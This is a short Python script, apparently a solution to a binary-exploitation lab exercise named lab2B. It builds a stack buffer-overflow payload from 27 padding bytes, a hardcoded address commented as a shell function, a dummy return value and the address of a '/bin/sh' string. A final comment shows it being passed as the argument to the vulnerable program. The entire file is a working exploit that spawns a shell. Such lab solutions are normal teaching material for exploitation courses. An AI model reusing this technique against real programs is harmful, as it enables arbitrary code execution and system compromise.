  1 import struct
  2
  3 payload = 'A'*27
  4 payload += struct.pack('I', 0x080486bd) #shell address
  5 payload += '0'*4 #return parameter
  6 payload += struct.pack('I', 0x080487d0) #binsh address
  7 print(payload)
  # ./lab2B `python /tmp/lab2B.py`
